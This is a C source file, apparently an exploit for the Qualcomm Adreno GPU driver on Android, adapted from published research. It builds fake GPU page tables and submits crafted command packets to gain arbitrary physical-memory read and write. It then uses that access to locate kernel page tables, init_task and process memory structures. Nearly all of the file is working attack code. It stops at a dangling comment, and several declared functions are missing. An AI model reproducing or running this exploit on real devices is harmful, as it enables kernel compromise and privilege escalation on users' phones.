#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO

#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include "adrenaline.h"
#include <string.h>
#include <stdbool.h>
#include <sys/wait.h>
#include <sys/capability.h>
#include <setjmp.h>
#include <stdarg.h>
#include <ctype.h> // For toupper()

const uint64_t kFakeGpuAddr = 0x40403000;

// Global context for fast access
static struct {
    uint64_t* map;           // Page used for data access
    uint64_t* page_map;      // Page used to access PTE table
    uint64_t pte_a_index;    // Index of PTE A in the PTE table
    uint64_t original_pte_a; // Original value of PTE A (for restoration)
    uint64_t pte_table_pa;   // Physical address of the PTE table
    bool initialized;
} g_fast_rw = {0};

// Structure to hold kernel image info
struct kernel_image_info {
    uint64_t base_pa;      // Physical base address
    uint64_t text_offset;  // Offset to kernel text section
    uint64_t image_size;   // Total kernel image size
};

// Definition of struct cheese_gpu_rw
struct cheese_gpu_rw {
    int fd;
    uint32_t ctx_id;

    uint32_t* payload_buf;
    uint64_t payload_gpuaddr;
    uint32_t* output_buf;
    uint64_t output_gpuaddr;

    void* target_physical_page;

    uint64_t phyaddr;

    void* garbage;
    uint64_t swapper_pg_dir_phys; // Added for stabilization
    uint64_t init_task_phys;      // Added for stabilization
    uint64_t pte_a_index;
    uint64_t pte_addr_b;
    uint64_t original_pte_b;
    uint64_t kernel_base_pa;      // Kernel base physical address
    uint64_t kernel_size;         // Actual kernel image size
};

// Add this missing definition if not present in adrenaline.h
#ifndef cp_gpuaddr
#define cp_gpuaddr(buf, addr) ({ \
    uint64_t _addr = (addr); \
    uint32_t* _buf = (buf); \
    _buf[0] = _addr & 0xFFFFFFFF; \
    _buf[1] = (_addr >> 32) & 0xFFFFFFFF; \
    2; \
})
#endif

// Kernel structure offsets
#define OFFSETOF_TASK_STRUCT_MM 0x518
#define OFFSETOF_MM_PGD 0x48

// Forward declarations for original functions
int kgsl_ctx_create0(int fd, uint32_t *ctx_id);
int kgsl_ctx_destroy(int fd, uint32_t ctx_id);
int kgsl_map(int fd, unsigned long addr, size_t len, uint64_t *gpuaddr);
static inline uint64_t compute_pt_index(uint64_t addr, int level);
static int ReadPhys64(struct cheese_gpu_rw* cheese, uint64_t phys_addr, uint64_t* out_val);
static uint64_t walk_page_table_for_pte(struct cheese_gpu_rw* cheese, uint64_t pgd_phys_addr, uint64_t virtual_addr);
static uint64_t get_mm_struct_from_task(struct cheese_gpu_rw* cheese, uint64_t task_struct_addr);
uint64_t kernel_pread_u64(struct cheese_gpu_rw* cheese, uint64_t paddr);
void kernel_pwrite_u64(struct cheese_gpu_rw* cheese, uint64_t paddr, uint64_t val);
uint64_t kernel_va_to_pa(struct cheese_gpu_rw* cheese, uint64_t kva);
int kgsl_gpu_command_payload(int fd, uint32_t ctx_id, uint64_t gpuaddr, uint32_t cmdsize, uint32_t n, uint32_t target_idx, uint64_t target_cmd, uint32_t target_size);
int setup_pagetables(uint8_t *tt0, uint32_t pages, uint32_t tt0phys, uint64_t fake_gpuaddr, uint64_t target_pa);
static inline void tu_sync_cacheline_to_gpu(void const *p);
static inline void tu_sync_cacheline_from_gpu(void const *p);
uint32_t tu_get_l1_dcache_size();
static void sync_cache_to_gpu(void* start, void* end);
static void sync_cache_from_gpu(void* start, void* end);
static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_gpuaddr, uint64_t phyaddr, uint64_t completion_marker_write_addr, bool write, uint64_t write_addr, uint32_t count, uint32_t* values);
int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese);
int cheese_shutdown(struct cheese_gpu_rw* cheese);
static uint64_t get_pgd_from_mm(struct cheese_gpu_rw* cheese, uint64_t mm_struct_pa);
static uint64_t get_curr_task_struct(struct cheese_gpu_rw* cheese);
void log_info(const char* format, ...);
uint64_t kernel_vread_u64(struct cheese_gpu_rw* ctx, uint64_t kva);
void kernel_write_u64(struct cheese_gpu_rw* ctx, uint64_t paddr, uint64_t val, bool ignored);
uint64_t get_pgd_offset(uint64_t addr);
uint64_t get_pmd_offset(uint64_t addr);
uint64_t get_pte_offset(uint64_t addr);
void flush_tlb();
uint64_t phys_to_readwrite_pte(uint64_t pa);

// Forward declarations for new functions
static void flush_tlb_mprotect(void *addr, size_t len);
static int init_fast_rw(struct cheese_gpu_rw* cheese);
static uint64_t fast_pread_u64(struct cheese_gpu_rw* cheese, uint64_t pa);
static void fast_pwrite_u64(struct cheese_gpu_rw* cheese, uint64_t pa, uint64_t val);
static void dump_kernel_memory_fast(struct cheese_gpu_rw* cheese, uint64_t start_pa, uint64_t size, const char* filename);
static int parse_kernel_header(struct cheese_gpu_rw* cheese, uint64_t kernel_base_pa, struct kernel_image_info* info);
static uint64_t estimate_kernel_size_heuristic(struct cheese_gpu_rw* cheese, uint64_t kernel_base_pa);

const uint64_t kGarbageSize = 16 * 1024 * 1024;

// Page table constants for PTE calculation
#define PAGE_SHIFT 12
#define LEVEL_COUNT 4  // 4-level page table

// Helper function to compute page table index for a given address and level
static inline uint64_t compute_pt_index(uint64_t addr, int level) {
    uint64_t vpfn = addr >> PAGE_SHIFT;
    vpfn >>= (3 - level) * 9;
    return vpfn & 0x1FF;  // 9 bits for the index
}

// from adrenaline.cpp:
// https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html

/* modified version of kilroy's kgsl_ctx_create. create a KGSL context that will use
 * ringbuffer 0, and make sure KGSL_CONTEXT_USER_GENERATED_TS is disabled */
int kgsl_ctx_create0(int fd, uint32_t *ctx_id) {
    struct kgsl_drawctxt_create req = {
            .flags = 0x00001812, // low prio, rb 0
    };
    int ret;

    ret = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &req);
    if (ret)
        return ret;

    *ctx_id = req.drawctxt_id;

    return 0;
}

/* cleanup an existing GPU context */
int kgsl_ctx_destroy(int fd, uint32_t ctx_id) {
    struct kgsl_drawctxt_destroy req = {
            .drawctxt_id = ctx_id,
    };

    return ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &req);
}

#define KGSL_MEMFLAGS_GPUREADONLY 0x01000000U

/* modified version of kilroy's kgsl_map. the choice to use KGSL_MEMFLAGS_USE_CPU_MAP
 * comes from earlier debugging efforts, but a normal user mapping should work as well,
 * it would just need to use uint64_t and drop the flags. */
// https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/kgsl_utils.c#L59
int kgsl_map(int fd, unsigned long addr, size_t len, uint64_t *gpuaddr) {
    struct kgsl_map_user_mem req = {
            .len = len,
            .offset = 0,
            .hostptr = addr,
            .memtype = KGSL_USER_MEM_TYPE_ADDR,
            // .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
    };
    int ret;

    ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    if (ret)
        return ret;

    *gpuaddr = req.gpuaddr;

    return 0;
}

// Complete function to walk the page table and find the final PTE that maps a virtual address
static int ReadPhys64(struct cheese_gpu_rw* cheese, uint64_t phys_addr, uint64_t* out_val) {
    uint32_t low, high;

    if (setup_pagetables(cheese->target_physical_page, 1, cheese->phyaddr, kFakeGpuAddr, phys_addr & ~0xfffull)) {
        return 1;
    }
    sync_cache_to_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);

    // Read low 32 bits
    if (DoWrite(cheese->fd, cheese->ctx_id, cheese->payload_buf, cheese->payload_gpuaddr, 
                cheese->phyaddr, kFakeGpuAddr + 0x1100, /*write=*/false, 
                kFakeGpuAddr + (phys_addr & 0xfffull), 1, NULL)) {
        return 1;
    }
    sleep(1);
    sync_cache_from_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);
    volatile uint32_t* result_marker = cheese->target_physical_page + 0x100;
    if (result_marker[0] != 0x41414141) {
        return 1;
    }
    low = *(volatile uint32_t*)(cheese->target_physical_page + 0x104);
    result_marker[0] = 0;
    sync_cache_to_gpu((void*)result_marker, (void*)(result_marker+1));

    // Read high 32 bits
    uint64_t high_addr = phys_addr + 4;
    if ((high_addr & ~0xfffull) != (phys_addr & ~0xfffull)) {
        if (setup_pagetables(cheese->target_physical_page, 1, cheese->phyaddr, kFakeGpuAddr, high_addr & ~0xfffull)) {
            return 1;
        }
        sync_cache_to_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);
    }

    if (DoWrite(cheese->fd, cheese->ctx_id, cheese->payload_buf, cheese->payload_gpuaddr, 
                cheese->phyaddr, kFakeGpuAddr + 0x1100, /*write=*/false, 
                kFakeGpuAddr + (high_addr & 0xfffull), 1, NULL)) {
        return 1;
    }
    sleep(1);
    sync_cache_from_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);
    if (result_marker[0] != 0x41414141) {
        return 1;
    }
    high = *(volatile uint32_t*)(cheese->target_physical_page + 0x104);

    *out_val = ((uint64_t)high << 32) | low;
    return 0;
}

// Function to properly walk page tables for 39-bit virtual addresses (typical on Android)
static uint64_t walk_page_table_for_pte(struct cheese_gpu_rw* cheese, uint64_t pgd_phys_addr, uint64_t virtual_addr) {
    // For 39-bit VA: 3-level page table
    // Level 1 (PGD): bits [38:30] - 9 bits, 512 entries
    uint64_t pgd_index = (virtual_addr >> 30) & 0x1FF;
    uint64_t pgd_entry_addr = pgd_phys_addr + (pgd_index * sizeof(uint64_t));
    
    fprintf(stderr, "walk_page_table: VA=0x%lx, PGD index=%lu, PGD entry addr=0x%lx\n", 
            virtual_addr, pgd_index, pgd_entry_addr);
    
    uint64_t pgd_entry_val;
    if (ReadPhys64(cheese, pgd_entry_addr, &pgd_entry_val)) {
        fprintf(stderr, "walk_page_table: Failed to read PGD entry\n");
        return 0;
    }
    
    fprintf(stderr, "walk_page_table: PGD entry value=0x%lx\n", pgd_entry_val);
    
    // Check if entry is valid - bits [1:0] should be 0x3 for table descriptor
    if ((pgd_entry_val & 0x3) != 0x3) {
        fprintf(stderr, "walk_page_table: Invalid PGD entry (bits[1:0]=0x%lx, expected 0x3)\n", 
                pgd_entry_val & 0x3);
        return 0;
    }
    
    // Extract PMD table address - bits [47:12]
    uint64_t pmd_addr = pgd_entry_val & 0x0000FFFFFFFFF000ULL;
    if (!pmd_addr) {
        fprintf(stderr, "walk_page_table: Null PMD address\n");
        return 0;
    }
    
    // Level 2 (PMD): bits [29:21] - 9 bits
    uint64_t pmd_index = (virtual_addr >> 21) & 0x1FF;
    uint64_t pmd_entry_addr = pmd_addr + (pmd_index * sizeof(uint64_t));
    
    fprintf(stderr, "walk_page_table: PMD addr=0x%lx, PMD index=%lu, PMD entry addr=0x%lx\n",
            pmd_addr, pmd_index, pmd_entry_addr);
    
    uint64_t pmd_entry_val;
    if (ReadPhys64(cheese, pmd_entry_addr, &pmd_entry_val)) {
        fprintf(stderr, "walk_page_table: Failed to read PMD entry\n");
        return 0;
    }
    
    fprintf(stderr, "walk_page_table: PMD entry value=0x%lx\n", pmd_entry_val);
    
    // Check if it's a valid entry
    if ((pmd_entry_val & 0x1) == 0) {
        fprintf(stderr, "walk_page_table: Invalid PMD entry (bit 0 not set)\n");
        return 0;
    }
    
    // Check if it's a block mapping (2MB page) - bit[1] = 0 means block
    if ((pmd_entry_val & 0x3) == 0x1) {
        fprintf(stderr, "walk_page_table: PMD is a block descriptor (2MB page) - cannot get PTE\n");
        return 0;
    }
    
    // It's a table descriptor - extract PTE table address
    uint64_t pte_addr = pmd_entry_val & 0x0000FFFFFFFFF000ULL;
    if (!pte_addr) {
        fprintf(stderr, "walk_page_table: Null PTE address\n");
        return 0;
    }
    
    // Level 3 (PTE): bits [20:12] - 9 bits
    uint64_t pte_index = (virtual_addr >> 12) & 0x1FF;
    uint64_t target_pte_addr = pte_addr + (pte_index * sizeof(uint64_t));
    
    fprintf(stderr, "walk_page_table: PTE addr=0x%lx, PTE index=%lu, target PTE addr=0x%lx\n",
            pte_addr, pte_index, target_pte_addr);
    
    return target_pte_addr;
}

/* send pad IBs and a payload IB at a specific index to the GPU */
int kgsl_gpu_command_payload(int fd, uint32_t ctx_id, uint64_t gpuaddr, uint32_t cmdsize, uint32_t n, uint32_t target_idx, uint64_t target_cmd, uint32_t target_size) {
    struct kgsl_command_object *cmds;

    struct kgsl_gpu_command req = {
            .context_id = ctx_id,
            .cmdsize = sizeof(struct kgsl_command_object),
            .numcmds = n,
    };
    size_t cmds_size;
    uint32_t i;

    cmds_size = n * sizeof(struct kgsl_command_object);

    cmds = (struct kgsl_command_object *) malloc(cmds_size);

    if (cmds == NULL) {
        return -1;
    }

    memset(cmds, 0, cmds_size);

    for (i = 0; i < n; i++) {
        cmds[i].flags = KGSL_CMDLIST_IB;

        if (i == target_idx) {
            cmds[i].gpuaddr = target_cmd;
            cmds[i].size = target_size;
        }
        else {
            cmds[i].gpuaddr = gpuaddr + (i << 16);
            cmds[i].size = cmdsize;
        }
    }

    req.cmdlist = (unsigned long) cmds;

    int err = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &req);

    free(cmds);
    return err;
}

#define NPBUFS 256

#define LEVEL1_SHIFT    30
#define LEVEL1_MASK     (0x1fful << LEVEL1_SHIFT)

#define LEVEL2_SHIFT    21
#define LEVEL2_MASK     (0x1ff << LEVEL2_SHIFT)

#define LEVEL3_SHIFT    12
#define LEVEL3_MASK     (0x1ff << LEVEL3_SHIFT)

#define ENTRY_VALID     3
#define ENTRY_RW        (1 << 6)

/* Normal Non-Cacheable memory */
#define ENTRY_MEMTYPE_NNC   (3 << 2)

/* outer attributes */
#define ENTRY_OUTER_SHARE (2 << 8)

/* Active */
#define ENTRY_AF (1<<10)

/* Non-Global */
#define ENTRY_NG (1<<11)

int setup_pagetables(uint8_t *tt0, uint32_t pages, uint32_t tt0phys, uint64_t fake_gpuaddr, uint64_t target_pa) {
    uint64_t *level_base;
    uint64_t level1_index, level2_index, level3_index;
    int i;

    for (i = 0; i < pages; i++) {
        level_base = (uint64_t *) (tt0 + (i * PAGE_SIZE));

        memset(level_base, 0x45, 4096);

        level1_index = (fake_gpuaddr & LEVEL1_MASK) >> LEVEL1_SHIFT;
        level2_index = (fake_gpuaddr & LEVEL2_MASK) >> LEVEL2_SHIFT;
        level3_index = (fake_gpuaddr & LEVEL3_MASK) >> LEVEL3_SHIFT;

        if (level1_index == level2_index || level1_index == level3_index ||
            level2_index == level3_index) {
            return -1;
        }

        level_base[level1_index] = (uint64_t) tt0phys | ENTRY_VALID;
        level_base[level2_index] = (uint64_t) tt0phys | ENTRY_VALID;
        level_base[level3_index] = (uint64_t) (target_pa | ENTRY_VALID | ENTRY_RW |
                                               ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                                               ENTRY_NG);
        level_base[level3_index + 1] = (uint64_t) (tt0phys | ENTRY_VALID | ENTRY_RW |
                                                ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                                                ENTRY_NG);
        for (int i = 0; i < 16; i++) {
            int index = level3_index + 2 + i;
            if (index == level1_index || index == level2_index || index == level3_index) {
                return -1;
            }
            level_base[index] = (uint64_t) (target_pa + (i*0x1000) | ENTRY_VALID | ENTRY_RW |
                ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                ENTRY_NG);
        }
    }

    return 0;
}

// From Mesa/Freedreno/Turnip

static inline void
    tu_sync_cacheline_to_gpu(void const *p __attribute__((unused)))
{
   __asm volatile("dc cvac, %0" : : "r" (p) : "memory");
}

static inline void
    tu_sync_cacheline_from_gpu(void const *p __attribute__((unused)))
{
   __asm volatile("dc civac, %0" : : "r" (p) : "memory");
}

uint32_t
    tu_get_l1_dcache_size()
{
   uint64_t ctr_el0;
   __asm__ volatile("mrs\t%x0, ctr_el0" : "=r"(ctr_el0));
   return 4 << ((ctr_el0 >> 16) & 0xf);
}

static uint64_t g_level1_dcache_size;

static void sync_cache_to_gpu(void* start, void* end) {
    start = (char *) ((uintptr_t) start & ~(g_level1_dcache_size - 1));
    for (; start < end; start += g_level1_dcache_size) {
        tu_sync_cacheline_to_gpu(start);
    }
}

static void sync_cache_from_gpu(void* start, void* end) {
    start = (char *) ((uintptr_t) start & ~(g_level1_dcache_size - 1));
    for (; start < end; start += g_level1_dcache_size) {
        tu_sync_cacheline_from_gpu(start);
    }
}

#define CP_WAIT_MEM_WRITES 0x12
#define CP_SET_DRAW_STATE 0x43
#define CP_SET_MODE 0x63
#define CP_INDIRECT_BUFFER 0x3f
#define DRAW_STATE_MODE_BINNING 0x1
#define DRAW_STATE_MODE_GMEM 0x2
#define DRAW_STATE_MODE_BYPASS 0x4
#define DRAW_STATE_DIRTY (1 << 16)
#define CP_SMMU_TABLE_UPDATE 0x53
#define CP_CONTEXT_SWITCH_YIELD 0x6b

#define CP_MEMCPY 0x75

static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_gpuaddr, uint64_t phyaddr, uint64_t completion_marker_write_addr, bool write, uint64_t write_addr, uint32_t count, uint32_t* values) {
    uint32_t* drawstate_buf = payload_buf + 0x100;
    uint64_t drawstate_gpuaddr = payload_gpuaddr + 0x100*sizeof(uint32_t);
    uint32_t* drawstate_cmds = drawstate_buf;
    *drawstate_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, phyaddr);
    *drawstate_cmds++ = 0;
    *drawstate_cmds++ = 0;
    drawstate_cmds += cp_wait_for_me(drawstate_cmds);
    drawstate_cmds += cp_wait_for_idle(drawstate_cmds);
    
    if (write) {
        *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 2 + count);
        drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
        for (int i = 0; i < count; i++) {
            *drawstate_cmds++ = values[i];
        }
    } else {
        if (count > 1) {
            for (int i = 0; i < count; i++) {
                *drawstate_cmds++ = cp_type7_packet(CP_MEMCPY, 5);
                *drawstate_cmds++ = 1;
                drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr + i*0x1000);
                drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr + 4 + i*4);
            }
        } else {
            *drawstate_cmds++ = cp_type7_packet(CP_MEMCPY, 5);
            *drawstate_cmds++ = count;
            drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
            drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr + 4);
        }
    }
    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr);
    *drawstate_cmds++ = 0x41414141;

    uint32_t* payload_cmds = payload_buf;
    *payload_cmds++ = cp_type7_packet(CP_SET_MODE, 1);
    *payload_cmds++ = 1;
    *payload_cmds++ = cp_type7_packet(CP_SET_DRAW_STATE, 3);
    *payload_cmds++ = (drawstate_cmds - drawstate_buf) | ((DRAW_STATE_MODE_BINNING | DRAW_STATE_MODE_GMEM | DRAW_STATE_MODE_BYPASS) << 20);
    payload_cmds += cp_gpuaddr(payload_cmds, drawstate_gpuaddr);

    uint32_t cmd_size = (payload_cmds - payload_buf) * sizeof(uint32_t);

    sync_cache_to_gpu((void*)payload_buf, ((void*)payload_buf) + 0x1000);
    int err = kgsl_gpu_command_payload(fd, ctx_id, 0, 0, 1, 0, payload_gpuaddr, cmd_size);
    if (err) {
        return 1;
    }
    return 0;
}

const uint64_t gPhyAddrs[] = {0xfebeb000, 0xd0b3b000, 0xbe690000, 0xd5cf0000};

int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
    uint64_t kernel_physical_memory_region = 0xA8000000;
    uint64_t kernel_read_offset = 0x4;
    uint64_t target_read_physical_address = kernel_physical_memory_region + kernel_read_offset;

    uint64_t phyaddr = 0xfebeb000;
    if (getenv("CHEESE_PHYADDR")) {
        phyaddr = strtoull(getenv("CHEESE_PHYADDR"), NULL, 0);
    } else if (getenv("CHEESE_ATTEMPT")) {
        phyaddr = gPhyAddrs[atoi(getenv("CHEESE_ATTEMPT"))];
    }

    uint64_t pbuf_len = PAGE_SIZE * 4096;
    uint8_t *pbufs[NPBUFS];

    for (int i = 0; i < NPBUFS; i++) {
        uint8_t * pbuf = (uint8_t *) mmap(NULL, pbuf_len, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);

        if (pbuf == (uint8_t *) MAP_FAILED) {
            fprintf(stderr, "pbuf mmap failed (%d)\n", i);
            return 1;
        }

        int ret = setup_pagetables(pbuf, pbuf_len/4096, phyaddr, kFakeGpuAddr, target_read_physical_address & ~0xfffull);

        if (ret == -1) {
            fprintf(stderr, "setup_pagetables failed\n");
            return 1;
        }

        pbufs[i] = pbuf;
        sync_cache_to_gpu((void*)pbuf, ((void*)pbuf) + pbuf_len);
    }

    int fd = open("/dev/kgsl-3d0", O_RDWR|O_CLOEXEC);
    if (fd == -1) {
        fprintf(stderr, "Can't open kgsl\n");
        return 1;
    }

    uint32_t ctx_id;

    int err = kgsl_ctx_create0(fd, &ctx_id);
    if (err) {
        fprintf(stderr, "Can't create context: %s\n", strerror(err));
        return 1;
    }

    uint32_t* payload_buf = mmap(NULL, PAGE_SIZE,
                                        PROT_READ|PROT_WRITE,
                                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (payload_buf == MAP_FAILED) {
        fprintf(stderr, "Can't map buf: %s\n", strerror(errno));
        return 1;
    }

    uint64_t payload_gpuaddr;

    err = kgsl_map(fd, (unsigned long)payload_buf, PAGE_SIZE, &payload_gpuaddr);
    if (err) {
        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
        return 1;
    }

    uint32_t* output_buf = (uint32_t *) mmap(NULL, PAGE_SIZE,
        PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    uint64_t output_gpuaddr;
    err = kgsl_map(fd, (unsigned long)output_buf, PAGE_SIZE, &output_gpuaddr);
    if (err) {
        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
        return 1;
    }

    if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, false, kFakeGpuAddr + (target_read_physical_address & 0xfffull), 1, NULL)) {
        fprintf(stderr, "Can't do first read\n");
    }
    sleep(1);

    void* target_physical_page = NULL;
    int target_pbuf = -1;

    for (int i = 0; i < NPBUFS; i++) {
        void* pbuf = pbufs[i];
        for (int off = 0; off < pbuf_len; off += 4096) {
            void* page_start = pbuf + off;
            sync_cache_from_gpu((void*)page_start, ((void*)page_start) + 0x1000);
            uint32_t* target = page_start + 0x100;
            if (target[0] == 0x41414141) {
                fprintf(stderr, "found it: virt addr = %p\n", page_start);
                target_physical_page = page_start;
                target_pbuf = i;
            }
        }
    }

    if (target_pbuf == -1) {
        fprintf(stderr, "can't find target\n");
        return 1;
    }

    uint32_t read_output = *(uint32_t*)(target_physical_page + 0x104);
    fprintf(stderr, "read output: %x\n", read_output);

    if (read_output == 0) {
        fprintf(stderr, "can't find kernel entry at %lx\n", target_read_physical_address);
        return 1;
    }

    uint32_t branch_off = read_output & ((1 << 26) - 1);
    uint64_t kernel_entry_file_off = kernel_read_offset + (branch_off << 2);
    fprintf(stderr, "kernel entry = %lx\n", kernel_physical_memory_region + kernel_entry_file_off);

    uint64_t swapper_pg_dir_off = 0;
    if (getenv("CHEESE_SWAPPER_PG_DIR_OFF")) {
        swapper_pg_dir_off = strtoull(getenv("CHEESE_SWAPPER_PG_DIR_OFF"), NULL, 0);
    } else {
        target_read_physical_address = kernel_physical_memory_region + kernel_entry_file_off - 0xf000 - 0x6000 + 2*sizeof(uint64_t);
        fprintf(stderr, "target_read_physical_address = %lx\n", target_read_physical_address);
        if (setup_pagetables(target_physical_page, 1,
        phyaddr, kFakeGpuAddr, target_read_physical_address & ~0xfffull)) {
            return 1;
        }
        sync_cache_to_gpu(target_physical_page, target_physical_page + 0x1000);
        if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, false, kFakeGpuAddr + 0x2000 + (target_read_physical_address & 0xfffull), 16, NULL)) {
            fprintf(stderr, "Can't do second read\n");
            return 1;
        }
        fprintf(stderr, "CP_MEMCPY read for swapper_pg_dir successful.\n");
        sleep(1);
        sync_cache_from_gpu(target_physical_page, target_physical_page + 0x1000);
        uint32_t second_read_sentinel = *(uint32_t*)(target_physical_page + 0x100);
        fprintf(stderr, "second read sentinel: %x\n", second_read_sentinel);
        if (second_read_sentinel != 0x41414141) {
            fprintf(stderr, "Fail\n");
            return 1;
        }

        for (int i = 15; i >= 0; i--) {
            read_output = *(uint32_t*)(target_physical_page + 0x104 + i*4);
            fprintf(stderr, "second read value: %x\n", read_output);
            if (read_output == 0x45454545) {
                fprintf(stderr, "Fail\n");
                return 1;
            }
            if ((read_output & 0xfff) == 0x3) {
                uint64_t idmap_pg_dir_off = kernel_entry_file_off - 0xf000 - 0x6000 + i*0x1000;
                swapper_pg_dir_off = idmap_pg_dir_off + 0x5000;
                fprintf(stderr, "found CHEESE_SWAPPER_PG_DIR_OFF=0x%lx\n", swapper_pg_dir_off);

                uint64_t init_task_off = idmap_pg_dir_off + 0x321F80;
                cheese->init_task_phys = kernel_physical_memory_region + init_task_off;
                fprintf(stderr, "Found init_task_phys: %#lx\n", cheese->init_task_phys);

                break;
            }
        }
        if (!swapper_pg_dir_off) {
            fprintf(stderr, "can't find swapper_pg_dir\n");
            return 1;
        }
        sleep(1);
    }

    uint64_t swapper_pg_dir_phys = kernel_physical_memory_region + swapper_pg_dir_off;
    cheese->swapper_pg_dir_phys = swapper_pg_dir_phys;
    fprintf(stderr, "Found swapper_pg_dir_phys: %#lx\n", swapper_pg_dir_phys);

    cheese->fd = fd;
    cheese->ctx_id = ctx_id;
    cheese->payload_buf = payload_buf;
    cheese->payload_gpuaddr = payload_gpuaddr;
    cheese->output_buf = output_buf;
    cheese->output_gpuaddr = output_gpuaddr;
    cheese->target_physical_page = target_physical_page;
    cheese->phyaddr = phyaddr;
    cheese->kernel_base_pa = kernel_physical_memory_region;

    // Don't unmap the buffer containing target_physical_page
    for (int i = 0; i < NPBUFS; i++) {
        if (i != target_pbuf) {  // Skip the buffer we're using
            munmap(pbufs[i], pbuf_len);
            pbufs[i] = NULL;
        }
    }
    return 0;
}

int cheese_shutdown(struct cheese_gpu_rw* cheese) {
    int err = kgsl_ctx_destroy(cheese->fd, cheese->ctx_id);
    if (err) {
        fprintf(stderr, "Can't destroy context: %s\n", strerror(err));
        return 1;
    }

    close(cheese->fd);
    return 0;
}

static uint64_t get_pgd_from_mm(struct cheese_gpu_rw* cheese, uint64_t mm_struct_pa) {
    uint64_t pgd_ptr_phys_addr = mm_struct_pa + OFFSETOF_MM_PGD;
    uint64_t pgd_va = 0;

    if (ReadPhys64(cheese, pgd_ptr_phys_addr, &pgd_va)) {
        fprintf(stderr, "get_pgd_from_mm: Failed to read pgd field from mm_struct\n");
        return 0;
    }

    if (pgd_va == 0) {
        fprintf(stderr, "get_pgd_from_mm: pgd VA is null\n");
        return 0;
    }

    fprintf(stderr, "Found PGD at virtual address: 0x%lx\n", pgd_va);

    uint64_t pgd_pa = kernel_va_to_pa(cheese, pgd_va);
    if (pgd_pa == 0) {
        fprintf(stderr, "get_pgd_from_mm: failed to convert PGD VA to PA\n");
        return 0;
    }

    fprintf(stderr, "Converted PGD VA to PA: 0x%lx\n", pgd_pa);
    return pgd_pa;
}

static uint64_t get_mm_struct_from_task(struct cheese_gpu_rw* cheese, uint64_t task_struct_addr) {
    uint64_t mm_field_addr = task_struct_addr + OFFSETOF_TASK_STRUCT_MM;
    uint64_t mm_struct_addr = 0;
    
    if (ReadPhys64(cheese, mm_field_addr, &mm_struct_addr)) {
        fprintf(stderr, "get_mm_struct_from_task: Failed to read mm field from task_struct\n");
        return 0;
    }
    
    fprintf(stderr, "Found mm_struct at virtual address: 0x%lx\n", mm_struct_addr);
    return mm_struct_addr;
}

// ------------------- Start of stabilization code -------------------

uint64_t kernel_pread_u64(struct cheese_gpu_rw* cheese, uint64_t paddr) {
    uint64_t val = 0;
    if (ReadPhys64(cheese, paddr, &val)) {
        fprintf(stderr, "kernel_pread_u64 failed for addr %lx\n", paddr);
        return 0;
    }
    return val;
}

void kernel_pwrite_u64(struct cheese_gpu_rw* cheese, uint64_t paddr, uint64_t val) {
    uint32_t values[2];
    values[0] = val & 0xFFFFFFFF;
    values[1] = (val >> 32) & 0xFFFFFFFF;

    if (setup_pagetables(cheese->target_physical_page, 1, cheese->phyaddr, kFakeGpuAddr, paddr & ~0xfffull)) {
        fprintf(stderr, "kernel_pwrite_u64: setup_pagetables failed for addr %lx\n", paddr);
        return;
    }
    sync_cache_to_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);

    if (DoWrite(cheese->fd, cheese->ctx_id, cheese->payload_buf, cheese->payload_gpuaddr,
                cheese->phyaddr, kFakeGpuAddr + 0x1100, true, 
                kFakeGpuAddr + (paddr & 0xfffull), 2, values)) {
        fprintf(stderr, "kernel_pwrite_u64: DoWrite failed for addr %lx\n", paddr);
        return;
    }
    sleep(1);
    sync_cache_from_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);
    volatile uint32_t* result_marker = cheese->target_physical_page + 0x100;
    if (result_marker[0] != 0x41414141) {
        fprintf(stderr, "kernel_pwrite_u64: marker not set (0x%x)\n", result_marker[0]);
    }
    result_marker[0] = 0;
    sync_cache_to_gpu((void*)result_marker, (void*)(result_marker+1));
}

// Add validation for 39-bit VA space
